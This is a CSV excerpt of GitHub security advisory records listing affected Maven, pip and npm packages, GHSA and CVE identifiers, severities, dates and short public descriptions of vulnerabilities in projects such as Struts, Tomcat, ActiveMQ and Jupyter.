2731,34742,org.mindrot:jbcrypt,GHSA-9h6p-92jq-888x,CVE-2015-0886,https://github.com/advisories/GHSA-9h6p-92jq-888x,moderate,2022-05-13 01:05:53 UTC,Integer Overflow or Wraparound in JBCrypt,Integer overflow in the crypt_raw method in the key-stretching implementation in JBCrypt before 0.4 makes it easier for remote attackers to determine cleartext values of password hashes via a brute-force attack against hashes associated with the maximum exponent.,maven
2732,35647,org.apache.struts:struts-core,GHSA-cvvx-r33m-v7pq,CVE-2015-0899,https://github.com/advisories/GHSA-cvvx-r33m-v7pq,high,2022-05-14 03:15:11 UTC,Improper Input Validation in Apache Struts,The MultiPageValidator implementation in Apache Struts 1 1.1 through 1.3.10 allows remote attackers to bypass intended access restrictions via a modified page parameter.,maven
2733,34041,org.elasticsearch:elasticsearch,GHSA-w94p-6mhw-4qxw,CVE-2015-1427,https://github.com/advisories/GHSA-w94p-6mhw-4qxw,high,2022-05-14 02:49:44 UTC,Improper Access Control in Elasticsearch,The Groovy scripting engine in Elasticsearch before 1.3.8 and 1.4.x before 1.4.3 allows remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands via a crafted script.,maven
2734,34046,org.apache.hadoop:hadoop-common,GHSA-g48f-ff5h-5f64,CVE-2015-1776,https://github.com/advisories/GHSA-g48f-ff5h-5f64,moderate,2022-05-17 03:44:57 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Hadoop,"Apache Hadoop 2.6.x encrypts intermediate data generated by a MapReduce job and stores it along with the encryption key in a credentials file on disk when the Intermediate data encryption feature is enabled, which allows local users to obtain sensitive information by reading the file.",maven
2735,35270,org.opensaml:opensaml,GHSA-78fq-w796-q537,CVE-2015-1796,https://github.com/advisories/GHSA-78fq-w796-q537,moderate,2022-05-17 03:38:17 UTC,Improper Certificate Validation in Shibboleth Identity Provider and OpenSAML,"The PKIX trust engines in Shibboleth Identity Provider before 2.4.4 and OpenSAML Java (OpenSAML-J) before 2.6.5 trust candidate X.509 credentials when no trusted names are available for the entityID, which allows remote attackers to impersonate an entity via a certificate issued by a shibmd:KeyAuthority trust anchor.",maven
2736,33996,org.apache.derby:derby,GHSA-wr69-g62g-2r9h,CVE-2015-1832,https://github.com/advisories/GHSA-wr69-g62g-2r9h,critical,2022-05-13 01:14:26 UTC,Improper Restriction of XML External Entity Reference in Apace Derby,"XML external entity (XXE) vulnerability in the SqlXmlUtil code in Apache Derby before 10.12.1.1, when a Java Security Manager is not in place, allows context-dependent attackers to read arbitrary files or cause a denial of service (resource consumption) via vectors involving XmlVTI and the XML datatype.",maven
2737,35082,org.apache.jackrabbit:jackrabbit-core,GHSA-9284-j4c9-779q,CVE-2015-1833,https://github.com/advisories/GHSA-9284-j4c9-779q,moderate,2022-05-14 02:49:30 UTC,Improper Input Validation in Apache Jackrabbit,"XML external entity (XXE) vulnerability in Apache Jackrabbit before 2.0.6, 2.2.x before 2.2.14, 2.4.x before 2.4.6, 2.6.x before 2.6.6, 2.8.x before 2.8.1, and 2.10.x before 2.10.1 allows remote attackers to read arbitrary files and send requests to intranet servers via a crafted WebDAV request.",maven
2738,33924,mysql:mysql-connector-java,GHSA-gc43-g62c-99g2,CVE-2015-2575,https://github.com/advisories/GHSA-gc43-g62c-99g2,moderate,2022-05-17 00:25:07 UTC,Improper Access Control in MySQL Connectors Java,Unspecified vulnerability in the MySQL Connectors component in Oracle MySQL 5.1.34 and earlier allows remote authenticated users to affect confidentiality and integrity via unknown vectors related to Connector/J.,maven
2739,38232,org.apache.sling:org.apache.sling.servlets.post,GHSA-rxvx-44w5-44r7,CVE-2015-2944,https://github.com/advisories/GHSA-rxvx-44w5-44r7,moderate,2022-05-13 01:10:58 UTC,Improper Neutralization of Input During Web Page Generation in Apache Sling,"Multiple cross-site scripting (XSS) vulnerabilities in Apache Sling API before 2.2.2 and Apache Sling Servlets Post before 2.1.2 allow remote attackers to inject arbitrary web script or HTML via the URI, related to (1) org/apache/sling/api/servlets/HtmlResponse and (2) org/apache/sling/servlets/post/HtmlResponse.",maven
2740,35045,org.apache.activemq:activemq-client,GHSA-x6rc-54xp-ccxx,CVE-2015-3208,https://github.com/advisories/GHSA-x6rc-54xp-ccxx,critical,2022-05-14 02:21:03 UTC,Improper Restriction of XML External Entity Reference in Apache ActiveMQ,XML external entity (XXE) vulnerability in the XPath selector component in Artemis ActiveMQ before commit 48d9951d879e0c8cbb59d4b64ab59d53ef88310d allows remote attackers to have unspecified impact via unknown vectors.,maven
2741,34002,org.codehaus.groovy:groovy,GHSA-qg25-hgjv-cg9q,CVE-2015-3253,https://github.com/advisories/GHSA-qg25-hgjv-cg9q,critical,2022-05-13 01:25:41 UTC,Improper Neutralization of Special Elements in Output Used by a Downstream Component in Apache Groovy,The MethodClosure class in runtime/MethodClosure.java in Apache Groovy 1.7.0 through 2.4.3 allows remote attackers to execute arbitrary code or cause a denial of service via a crafted serialized object.,maven
2742,34041,org.elasticsearch:elasticsearch,GHSA-x8q8-4hp5-463w,CVE-2015-3337,https://github.com/advisories/GHSA-x8q8-4hp5-463w,moderate,2022-05-17 04:12:25 UTC,Improper Limitation of a Pathname to a Restricted Directory in Elasticsearch,"Directory traversal vulnerability in Elasticsearch before 1.4.5 and 1.5.x before 1.5.2, when a site plugin is enabled, allows remote attackers to read arbitrary files via unspecified vectors.",maven
2743,34041,org.elasticsearch:elasticsearch,GHSA-fh5x-4j57-6q5x,CVE-2015-4165,https://github.com/advisories/GHSA-fh5x-4j57-6q5x,high,2022-05-14 02:48:29 UTC,Improper Access Control in Elasticsearch,"The snapshot API in Elasticsearch before 1.6.0 when another application exists on the system that can read Lucene files and execute code from them, is accessible by the attacker, and the Java VM on which Elasticsearch is running can write to a location that the other application can read and execute from, allows remote authenticated users to write to and create arbitrary snapshot metadata files, and potentially execute arbitrary code.",maven
2744,19892,ipython,GHSA-q326-jhw3-699g,CVE-2015-4706,https://github.com/advisories/GHSA-q326-jhw3-699g,moderate,2022-05-17 00:36:05 UTC,Improper Neutralization of Input During Web Page Generation in IPython,Cross-site scripting (XSS) vulnerability in IPython 3.x before 3.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving JSON error messages and the /api/contents path.,pip
2745,19892,ipython,GHSA-66gw-5xpf-gfp5,CVE-2015-4707,https://github.com/advisories/GHSA-66gw-5xpf-gfp5,moderate,2022-05-13 01:31:05 UTC,Improper Neutralization of Input During Web Page Generation in IPython,Cross-site scripting (XSS) vulnerability in IPython before 3.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving JSON error messages and the /api/notebooks path.,pip
2746,34718,org.apache.cxf:cxf-core,GHSA-3336-h95j-hvvf,CVE-2015-5253,https://github.com/advisories/GHSA-3336-h95j-hvvf,moderate,2022-05-13 01:09:20 UTC,Improper Access Control in Apache CXF,"The SAML Web SSO module in Apache CXF before 2.7.18, 3.0.x before 3.0.7, and 3.1.x before 3.1.3 allows remote authenticated users to bypass authentication via a crafted SAML response with a valid signed assertion, related to a ""wrapping attack.""",maven
2747,34041,org.elasticsearch:elasticsearch,GHSA-jjq8-vfjq-j6v4,CVE-2015-5531,https://github.com/advisories/GHSA-jjq8-vfjq-j6v4,moderate,2022-05-14 02:48:01 UTC,Improper Limitation of a Pathname to a Restricted Directory in Elasticsearch,Directory traversal vulnerability in Elasticsearch before 1.6.1 allows remote attackers to read arbitrary files via unspecified vectors related to snapshot API calls.,maven
2748,35045,org.apache.activemq:activemq-client,GHSA-q9hr-3pg4-3jp4,CVE-2015-5254,https://github.com/advisories/GHSA-q9hr-3pg4-3jp4,critical,2022-05-13 01:30:05 UTC,Improper Input Validation in Apache ActiveMQ,"Apache ActiveMQ 5.x before 5.13.0 does not restrict the classes that can be serialized in the broker, which allows remote attackers to execute arbitrary code via a crafted serialized Java Message Service (JMS) ObjectMessage object.",maven
2749,35045,org.apache.activemq:activemq-client,GHSA-23cr-5hr4-rgwv,CVE-2015-6524,https://github.com/advisories/GHSA-23cr-5hr4-rgwv,moderate,2022-05-17 03:22:06 UTC,Improper Input Validation in Apache ActiveMQ,"The LDAPLoginModule implementation in the Java Authentication and Authorization Service (JAAS) in Apache ActiveMQ 5.x before 5.10.1 allows wildcard operators in usernames, which allows remote attackers to obtain credentials via a brute force attack. NOTE: this identifier was SPLIT from CVE-2014-3612 per ADT2 due to different vulnerability types.",maven
2750,34012,org.jsoup:jsoup,GHSA-48rh-qgjr-xfj6,CVE-2015-6748,https://github.com/advisories/GHSA-48rh-qgjr-xfj6,moderate,2022-05-13 01:28:44 UTC,Improper Neutralization of Input During Web Page Generation in Jsoup,Cross-site scripting (XSS) vulnerability in jsoup before 1.8.3.,maven
2751,19892,ipython,GHSA-4vwq-x64q-j4cj,CVE-2015-6938,https://github.com/advisories/GHSA-4vwq-x64q-j4cj,moderate,2022-05-14 02:04:49 UTC,Improper Neutralization of Input During Web Page Generation in Jupyter Notebook,"Cross-site scripting (XSS) vulnerability in the file browser in notebook/notebookapp.py in IPython Notebook before 3.2.2 and Jupyter Notebook 4.0.x before 4.0.5 allows remote attackers to inject arbitrary web script or HTML via a folder name.  NOTE: this was originally reported as a cross-site request forgery (CSRF) vulnerability, but this may be inaccurate.",pip
2752,20024,notebook,GHSA-4vwq-x64q-j4cj,CVE-2015-6938,https://github.com/advisories/GHSA-4vwq-x64q-j4cj,moderate,2022-05-14 02:04:49 UTC,Improper Neutralization of Input During Web Page Generation in Jupyter Notebook,"Cross-site scripting (XSS) vulnerability in the file browser in notebook/notebookapp.py in IPython Notebook before 3.2.2 and Jupyter Notebook 4.0.x before 4.0.5 allows remote attackers to inject arbitrary web script or HTML via a folder name.  NOTE: this was originally reported as a cross-site request forgery (CSRF) vulnerability, but this may be inaccurate.",pip
2753,19892,ipython,GHSA-92mr-v722-f48m,CVE-2015-7337,https://github.com/advisories/GHSA-92mr-v722-f48m,moderate,2022-05-17 03:25:49 UTC,Improper Input Validation in Jupyter Notebook,"The editor in IPython Notebook before 3.2.2 and Jupyter Notebook 4.0.x before 4.0.5 allows remote attackers to execute arbitrary JavaScript code via a crafted file, which triggers a redirect to files/, related to MIME types.",pip
2754,20024,notebook,GHSA-92mr-v722-f48m,CVE-2015-7337,https://github.com/advisories/GHSA-92mr-v722-f48m,moderate,2022-05-17 03:25:49 UTC,Improper Input Validation in Jupyter Notebook,"The editor in IPython Notebook before 3.2.2 and Jupyter Notebook 4.0.x before 4.0.5 allows remote attackers to execute arbitrary JavaScript code via a crafted file, which triggers a redirect to files/, related to MIME types.",pip
2755,34577,org.apache.solr:solr-core,GHSA-v6gf-x8fp-532v,CVE-2015-8797,https://github.com/advisories/GHSA-v6gf-x8fp-532v,moderate,2022-05-17 03:58:49 UTC,Improper Neutralization of Input During Web Page Generation in Apache Solr,Cross-site scripting (XSS) vulnerability in webapp/web/js/scripts/plugins.js in the stats page in the Admin UI in Apache Solr before 5.3.1 allows remote attackers to inject arbitrary web script or HTML via the entry parameter to a plugins/cache URI.,maven
2756,34577,org.apache.solr:solr-core,GHSA-mx2h-hf7j-2x3p,CVE-2015-8795,https://github.com/advisories/GHSA-mx2h-hf7j-2x3p,moderate,2022-05-17 03:59:03 UTC,Improper Neutralization of Input During Web Page Generation in Apache Solr,"Multiple cross-site scripting (XSS) vulnerabilities in the Admin UI in Apache Solr before 5.1 allow remote attackers to inject arbitrary web script or HTML via crafted fields that are mishandled during the rendering of the (1) Analysis page, related to webapp/web/js/scripts/analysis.js or (2) Schema-Browser page, related to webapp/web/js/scripts/schema-browser.js.",maven
2757,35045,org.apache.activemq:activemq-client,GHSA-8rcq-p4gh-vmj8,CVE-2016-0782,https://github.com/advisories/GHSA-8rcq-p4gh-vmj8,moderate,2022-05-14 01:14:51 UTC,Improper Neutralization of Input During Web Page Generation in Apache ActiveMQ,"The administration web console in Apache ActiveMQ 5.x before 5.11.4, 5.12.x before 5.12.3, and 5.13.x before 5.13.2 allows remote authenticated users to conduct cross-site scripting (XSS) attacks and consequently obtain sensitive information from a Java memory dump via vectors related to creating a queue.",maven
2758,38232,org.apache.sling:org.apache.sling.servlets.post,GHSA-m27m-628v-xxp2,CVE-2016-0956,https://github.com/advisories/GHSA-m27m-628v-xxp2,high,2022-05-14 02:47:05 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Sling Servlets Post,"The Servlets Post component 2.3.6 in Apache Sling, as used in Adobe Experience Manager 5.6.1, 6.0.0, and 6.1.0, allows remote attackers to obtain sensitive information via unspecified vectors.",maven
2759,17918,select2,GHSA-rf66-hmqf-q3fc,CVE-2016-10744,https://github.com/advisories/GHSA-rf66-hmqf-q3fc,moderate,2022-05-14 01:14:56 UTC,Improper Neutralization of Input During Web Page Generation in Select2,"In Select2 through 4.0.5, as used in Snipe-IT and other products, rich selectlists allow XSS. This affects use cases with Ajax remote data loading when HTML templates are used to display listbox data.",npm
2760,34341,com.hazelcast:hazelcast,GHSA-jv65-pf7v-f7p8,CVE-2016-10750,https://github.com/advisories/GHSA-jv65-pf7v-f7p8,high,2022-05-24 16:46:09 UTC,Deserialization of Untrusted Data in Hazelcast,"In Hazelcast before 3.11, the cluster join procedure is vulnerable to remote code execution via Java deserialization. If an attacker can reach a listening Hazelcast instance with a crafted JoinRequest, and vulnerable classes exist in the classpath, the attacker can run arbitrary code.",maven
2761,35647,org.apache.struts:struts-core,GHSA-7jw3-5q4w-89qg,CVE-2016-1181,https://github.com/advisories/GHSA-7jw3-5q4w-89qg,high,2022-05-13 01:25:20 UTC,Improper Input Validation in Apache Struts,"ActionServlet.java in Apache Struts 1 1.x through 1.3.10 mishandles multithreaded access to an ActionForm instance, which allows remote attackers to execute arbitrary code or cause a denial of service (unexpected memory access) via a multipart request, a related issue to CVE-2015-0899.",maven
2762,35647,org.apache.struts:struts-core,GHSA-5ggr-mpgw-3mgx,CVE-2016-1182,https://github.com/advisories/GHSA-5ggr-mpgw-3mgx,high,2022-05-13 01:25:19 UTC,Improper Input Validation in Apache Struts,"ActionServlet.java in Apache Struts 1 1.x through 1.3.10 does not properly restrict the Validator configuration, which allows remote attackers to conduct cross-site scripting (XSS) attacks or cause a denial of service via crafted input, a related issue to CVE-2015-0899.",maven
2763,34966,org.jgroups:jgroups,GHSA-rc7h-x6cq-988q,CVE-2016-2141,https://github.com/advisories/GHSA-rc7h-x6cq-988q,critical,2022-05-13 01:03:31 UTC,Improper Input Validation in JGroups,"JGroups before 4.0 does not require the proper headers for the ENCRYPT and AUTH protocols from nodes joining the cluster, which allows remote attackers to bypass security restrictions and send and receive messages within the cluster via unspecified vectors.",maven
2764,34743,org.springframework.amqp:spring-amqp,GHSA-hrp3-8p5w-27gv,CVE-2016-2173,https://github.com/advisories/GHSA-hrp3-8p5w-27gv,critical,2022-05-13 01:26:13 UTC,Improper Input Validation in Spring AMQP,org.springframework.core.serializer.DefaultDeserializer in Spring AMQP before 1.5.5 allows remote attackers to execute arbitrary code.,maven
2765,33992,com.squareup.okhttp3:okhttp,GHSA-4hc2-jh7r-wrc3,CVE-2016-2402,https://github.com/advisories/GHSA-4hc2-jh7r-wrc3,moderate,2022-05-13 01:11:51 UTC,Improper Certificate Validation in OkHttp,OkHttp before 2.7.4 and 3.x before 3.1.2 allows man-in-the-middle attackers to bypass certificate pinning by sending a certificate chain with a certificate from a non-pinned trusted CA and the pinned certificate.,maven
2766,38731,org.apache-extras.beanshell:bsh,GHSA-gxg6-rc6c-v673,CVE-2016-2510,https://github.com/advisories/GHSA-gxg6-rc6c-v673,high,2022-05-13 01:14:25 UTC,Improper Input Validation in BeanShell,"BeanShell (bsh) before 2.0b6, when included on the classpath by an application that uses Java serialization or XStream, allows remote attackers to execute arbitrary code via crafted serialized data, related to XThis.Handler.",maven
2767,37056,org.apache.hadoop:hadoop-yarn-server-nodemanager,GHSA-895m-ww55-59vw,CVE-2016-3086,https://github.com/advisories/GHSA-895m-ww55-59vw,critical,2022-05-17 01:08:00 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Hadoop,The YARN NodeManager in Apache Hadoop 2.6.x before 2.6.5 and 2.7.x before 2.7.3 can leak the password for credential store provider used by the NodeManager to YARN Applications.,maven
2768,35045,org.apache.activemq:activemq-client,GHSA-rxqh-fc23-gxp2,CVE-2016-3088,https://github.com/advisories/GHSA-rxqh-fc23-gxp2,critical,2022-05-14 01:14:51 UTC,Improper Input Validation in Apache ActiveMQ,The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.,maven
2769,34974,org.apache.struts:struts2-core,GHSA-383p-xqxx-rrmp,CVE-2016-3093,https://github.com/advisories/GHSA-383p-xqxx-rrmp,moderate,2022-05-17 03:42:18 UTC,Improper Input Validation in Apache Struts,"Apache Struts 2.0.0 through 2.3.24.1 does not properly cache method references when used with OGNL before 3.0.12, which allows remote attackers to cause a denial of service (block access to a web site) via unspecified vectors.",maven
2770,35665,org.python:jython,GHSA-6r7r-jj8h-pq6v,CVE-2016-4000,https://github.com/advisories/GHSA-6r7r-jj8h-pq6v,critical,2022-05-13 01:25:20 UTC,Deserialization of Untrusted Data in Jython,Jython before 2.7.1rc1 allows attackers to execute arbitrary code via a crafted serialized PyFunction object.,maven
2771,34898,org.python:jython-standalone,GHSA-6r7r-jj8h-pq6v,CVE-2016-4000,https://github.com/advisories/GHSA-6r7r-jj8h-pq6v,critical,2022-05-13 01:25:20 UTC,Deserialization of Untrusted Data in Jython,Jython before 2.7.1rc1 allows attackers to execute arbitrary code via a crafted serialized PyFunction object.,maven
2772,34061,io.netty:netty-all,GHSA-rv63-gqm8-9w8q,CVE-2016-4970,https://github.com/advisories/GHSA-rv63-gqm8-9w8q,high,2022-05-13 01:11:43 UTC,Loop with Unreachable Exit Condition in Netty,handler/ssl/OpenSslEngine.java in Netty 4.0.x before 4.0.37.Final and 4.1.x before 4.1.1.Final allows remote attackers to cause a denial of service (infinite loop).,maven
2773,35911,org.apache.qpid:qpid-jms-client,GHSA-f38p-mq64-h784,CVE-2016-4974,https://github.com/advisories/GHSA-f38p-mq64-h784,high,2022-05-14 02:46:14 UTC,Improper Input Validation in Apache Qpid AMQP 0-x JMS,"Apache Qpid AMQP 0-x JMS client before 6.0.4 and JMS (AMQP 1.0) before 0.10.0 does not restrict the use of classes available on the classpath, which might allow remote authenticated users with permission to send messages to deserialize arbitrary objects and execute arbitrary code by leveraging a crafted serialized object in a JMS ObjectMessage that is handled by the getObject function.",maven
2774,34081,org.apache.poi:poi,GHSA-pmqq-7wfv-jfff,CVE-2016-5000,https://github.com/advisories/GHSA-pmqq-7wfv-jfff,moderate,2022-05-13 01:14:25 UTC,Improper Restriction of XML External Entity Reference in Apache POI,"The XLSX2CSV example in Apache POI before 3.14 allows remote attackers to read arbitrary files via a crafted OpenXML document containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.",maven
2775,34422,org.apache.shiro:shiro-core,GHSA-4cf5-xmhp-3xj7,CVE-2022-32532,https://github.com/advisories/GHSA-4cf5-xmhp-3xj7,critical,2022-06-30 00:00:41 UTC,Improper Authorization in Apache Shiro,"Apache Shiro before 1.9.1, A RegexRequestMatcher can be misconfigured to be bypassed on some servlet containers. Applications using RegExPatternMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass.",maven
2776,36517,org.directwebremoting:dwr,GHSA-384c-gg34-g96h,CVE-2007-0184,https://github.com/advisories/GHSA-384c-gg34-g96h,high,2022-05-01 17:42:17 UTC,Incorrect Authorization in Getahead Direct Web Remoting,Getahead Direct Web Remoting (DWR) before 1.1.4 allows attackers to obtain unauthorized access to public methods via a crafted request that bypasses the include/exclude checks.,maven
2777,18505,git-clone,GHSA-8jmw-wjr8-2x66,CVE-2022-25900,https://github.com/advisories/GHSA-8jmw-wjr8-2x66,high,2022-07-02 00:00:19 UTC,Command injection in git-clone,"All versions of package git-clone are vulnerable to Command Injection due to insecure usage of the --upload-pack feature of git.
## Credits

Credit to @lirantal for discovering this vulnerability.",npm
2778,19936,html5lib,GHSA-v9v9-xffq-rwr4,CVE-2016-9909,https://github.com/advisories/GHSA-v9v9-xffq-rwr4,moderate,2022-05-17 02:57:58 UTC,Improper Neutralization of Input During Web Page Generation in html5lib,The serializer in html5lib before 0.99999999 might allow remote attackers to conduct cross-site scripting (XSS) attacks by leveraging mishandling of the < (less than) character in attribute values.,pip
2779,34423,org.apache.tomcat:tomcat-catalina,GHSA-w3j5-q8f2-3cqq,CVE-2016-8745,https://github.com/advisories/GHSA-w3j5-q8f2-3cqq,high,2022-05-14 01:10:16 UTC,Concurrent Execution using Shared Resource with Improper Synchronization in Apache Tomcat,"A bug in the error handling of the send file code for the NIO HTTP connector in Apache Tomcat 9.0.0.M1 to 9.0.0.M13, 8.5.0 to 8.5.8, 8.0.0.RC1 to 8.0.39, 7.0.0 to 7.0.73 and 6.0.16 to 6.0.48 resulted in the current Processor object being added to the Processor cache multiple times. This in turn meant that the same Processor could be used for concurrent requests. Sharing a Processor can result in information leakage between requests including, not not limited to, session ID and the response body. The bug was first noticed in 8.5.x onwards where it appears the refactoring of the Connector code for 8.5.x onwards made it more likely that the bug was observed. Initially it was thought that the 8.5.x refactoring introduced the bug but further investigation has shown that the bug is present in all currently supported Tomcat versions.",maven
2780,35760,org.apache.qpid:qpid-broker,GHSA-8vvh-crqv-jm64,CVE-2016-8741,https://github.com/advisories/GHSA-8vvh-crqv-jm64,high,2022-05-17 02:24:59 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Qpid Broker for Java,The Apache Qpid Broker for Java can be configured to use different so called AuthenticationProviders to handle user authentication. Among the choices are the SCRAM-SHA-1 and SCRAM-SHA-256 AuthenticationProvider types. It was discovered that these AuthenticationProviders in Apache Qpid Broker for Java 6.0.x before 6.0.6 and 6.1.x before 6.1.1 prematurely terminate the SCRAM SASL negotiation if the provided user name does not exist thus allowing remote attacker to determine the existence of user accounts. The Vulnerability does not apply to AuthenticationProviders other than SCRAM-SHA-1 and SCRAM-SHA-256.,maven
2781,34718,org.apache.cxf:cxf-core,GHSA-x7xf-253v-x3w8,CVE-2016-8739,https://github.com/advisories/GHSA-x7xf-253v-x3w8,high,2022-05-13 01:09:20 UTC,Improper Restriction of XML External Entity Reference in Apache CXF JAX-RS,The JAX-RS module in Apache CXF prior to 3.0.12 and 3.1.x prior to 3.1.9 provides a number of Atom JAX-RS MessageBodyReaders. These readers use Apache Abdera Parser which expands XML entities by default which represents a major XXE risk.,maven
2782,34002,org.codehaus.groovy:groovy,GHSA-xphj-m9cc-8fmq,CVE-2016-6814,https://github.com/advisories/GHSA-xphj-m9cc-8fmq,critical,2022-05-13 01:25:19 UTC,Deserialization of Untrusted Data in Groovy,"When an application with unsupported Codehaus versions of Groovy from 1.7.0 to 2.4.3, Apache Groovy 2.4.4 to 2.4.7 on classpath uses standard Java serialization mechanisms, e.g. to communicate between servers or to store local data, it was possible for an attacker to bake a special serialized object that will execute code directly when deserialized. All applications which rely on serialization and do not isolate the code which deserializes objects were subject to this vulnerability.",maven
2783,34718,org.apache.cxf:cxf-core,GHSA-vw2c-5wph-v92r,CVE-2016-6812,https://github.com/advisories/GHSA-vw2c-5wph-v92r,moderate,2022-05-13 01:09:20 UTC,Improper Neutralization of Input During Web Page Generation in Apache CXF,The HTTP transport module in Apache CXF prior to 3.0.12 and 3.1.x prior to 3.1.9 uses FormattedServiceListWriter to provide an HTML page which lists the names and absolute URL addresses of the available service endpoints. The module calculates the base URL using the current HttpServletRequest. The calculated base URL is used by FormattedServiceListWriter to build the service endpoint absolute URLs. If the unexpected matrix parameters have been injected into the request URL then these matrix parameters will find their way back to the client in the services list page which represents an XSS risk to the client.,maven
2784,34046,org.apache.hadoop:hadoop-common,GHSA-mf7c-35mq-75pj,CVE-2016-6811,https://github.com/advisories/GHSA-mf7c-35mq-75pj,high,2022-05-14 03:24:59 UTC,Insecure Inherited Permissions in  Apache Hadoop,"In Apache Hadoop 2.x before 2.7.4, a user who can escalate to yarn user can possibly run arbitrary commands as root user.",maven
2785,35045,org.apache.activemq:activemq-client,GHSA-5jg4-p78r-p5j3,CVE-2016-6810,https://github.com/advisories/GHSA-5jg4-p78r-p5j3,moderate,2022-05-14 01:06:24 UTC,Improper Neutralization of Input During Web Page Generation Apache ActiveMQ,"In Apache ActiveMQ 5.x before 5.14.2, an instance of a cross-site scripting vulnerability was identified to be present in the web based administration console. The root cause of this issue is improper user data output validation.",maven
2786,34423,org.apache.tomcat:tomcat-catalina,GHSA-q6x7-f33r-3wxx,CVE-2016-6797,https://github.com/advisories/GHSA-q6x7-f33r-3wxx,high,2022-05-13 01:02:15 UTC,Incorrect Authorization in Apache Tomcat,"The ResourceLinkFactory implementation in Apache Tomcat 9.0.0.M1 to 9.0.0.M9, 8.5.0 to 8.5.4, 8.0.0.RC1 to 8.0.36, 7.0.0 to 7.0.70 and 6.0.0 to 6.0.45 did not limit web application access to global JNDI resources to those resources explicitly linked to the web application. Therefore, it was possible for a web application to access any global JNDI resource whether an explicit ResourceLink had been configured or not.",maven
2787,34575,org.springframework.data:spring-data-jpa,GHSA-xr4v-28rm-pvgw,CVE-2016-6652,https://github.com/advisories/GHSA-xr4v-28rm-pvgw,moderate,2022-05-17 02:37:09 UTC,Improper Neutralization of Special Elements used in an SQL Command  Pivotal Spring Data JPA,"SQL injection vulnerability in Pivotal Spring Data JPA before 1.9.6 (Gosling SR6) and 1.10.x before 1.10.4 (Hopper SR4), when used with a repository that defines a String query using the @Query annotation, allows attackers to execute arbitrary JPQL commands via a sort instance with a function call.",maven
2788,34676,org.jboss.resteasy:resteasy-client,GHSA-r346-rmrg-qpgh,CVE-2016-6347,https://github.com/advisories/GHSA-r346-rmrg-qpgh,moderate,2022-05-17 02:48:28 UTC,Improper Neutralization of Input During Web Page Generation in RESTEasy,Cross-site scripting (XSS) vulnerability in the default exception handler in RESTEasy allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.,maven
2789,34676,org.jboss.resteasy:resteasy-client,GHSA-vxhj-3x7p-jxp5,CVE-2016-6345,https://github.com/advisories/GHSA-vxhj-3x7p-jxp5,moderate,2022-05-17 03:49:16 UTC,Exposure of Sensitive Information to an Unauthorized Actor in RESTEasy,"RESTEasy allows remote authenticated users to obtain sensitive information by leveraging ""insufficient use of random values"" in async jobs.",maven
2790,34086,com.jcraft:jsch,GHSA-q446-82vq-w674,CVE-2016-5725,https://github.com/advisories/GHSA-q446-82vq-w674,moderate,2022-05-13 01:09:33 UTC,Improper Limitation of a Pathname to a Restricted Directory in JCraft JSch,"Directory traversal vulnerability in JCraft JSch before 0.1.54 on Windows, when the mode is ChannelSftp.OVERWRITE, allows remote SFTP servers to write to arbitrary files via a ..\ (dot dot backslash) in a response to a recursive GET command.",maven
2791,34046,org.apache.hadoop:hadoop-common,GHSA-7q56-mp4c-gggg,CVE-2016-5393,https://github.com/advisories/GHSA-7q56-mp4c-gggg,high,2022-05-17 03:35:31 UTC,Improper Access Control in Apache Hadoop,"In Apache Hadoop 2.6.x before 2.6.5 and 2.7.x before 2.7.3, a remote user who can authenticate with the HDFS NameNode can possibly run arbitrary commands with the same privileges as the HDFS service.",maven
2792,34423,org.apache.tomcat:tomcat-catalina,GHSA-v646-rx6w-r3qq,CVE-2016-5388,https://github.com/advisories/GHSA-v646-rx6w-r3qq,high,2022-05-13 01:23:38 UTC,Improper Access Control in Apache Tomcat,"Apache Tomcat 7.x through 7.0.70 and 8.x through 8.5.4, when the CGI Servlet is enabled, follows RFC 3875 section 4.1.18 and therefore does not protect applications from the presence of untrusted client data in the HTTP_PROXY environment variable, which might allow remote attackers to redirect an application's outbound HTTP traffic to an arbitrary proxy server via a crafted Proxy header in an HTTP request, aka an ""httpoxy"" issue. NOTE: the vendor states ""A mitigation is planned for future releases of Tomcat, tracked as CVE-2016-5388""; in other words, this is not a CVE ID for a vulnerability.",maven
2793,34423,org.apache.tomcat:tomcat-catalina,GHSA-4v3g-g84w-hv7r,CVE-2016-5018,https://github.com/advisories/GHSA-4v3g-g84w-hv7r,critical,2022-05-13 01:02:15 UTC,Authentication Bypass Using an Alternate Path or Channel in Apache Tomcat,"In Apache Tomcat 9.0.0.M1 to 9.0.0.M9, 8.5.0 to 8.5.4, 8.0.0.RC1 to 8.0.36, 7.0.0 to 7.0.70 and 6.0.0 to 6.0.45 a malicious web application was able to bypass a configured SecurityManager via a Tomcat utility method that was accessible to web applications.",maven
2794,34046,org.apache.hadoop:hadoop-common,GHSA-8r28-r8cp-g6cp,CVE-2016-5001,https://github.com/advisories/GHSA-8r28-r8cp-g6cp,moderate,2022-05-13 01:08:56 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Hadoop,This is an information disclosure vulnerability in Apache Hadoop before 2.6.4 and 2.7.x before 2.7.2 in the short-circuit reads feature of HDFS. A local user on an HDFS DataNode may be able to craft a block token that grants unauthorized read access to random files by guessing certain fields in the token.,maven
2795,19835,lxml,GHSA-wrxv-2j5q-m38w,CVE-2022-2309,https://github.com/advisories/GHSA-wrxv-2j5q-m38w,high,2022-07-06 00:00:30 UTC,lxml NULL Pointer Dereference allows attackers to cause a denial of service,"NULL Pointer Dereference allows attackers to cause a denial of service (or application crash). This only applies when lxml is used together with libxml2 2.9.10 through 2.9.14. libxml2 2.9.9 and earlier are not affected. It allows triggering crashes through forged input data, given a vulnerable code sequence in the application. The vulnerability is caused by the iterwalk function (also used by the canonicalize function). Such code shouldn't be in wide-spread use, given that parsing + iterwalk would usually be replaced with the more efficient iterparse function. However, an XML converter that serialises to C14N would also be vulnerable, for example, and there are legitimate use cases for this code sequence. If untrusted input is received (also remotely) and processed via iterwalk function, a crash can be triggered.",pip
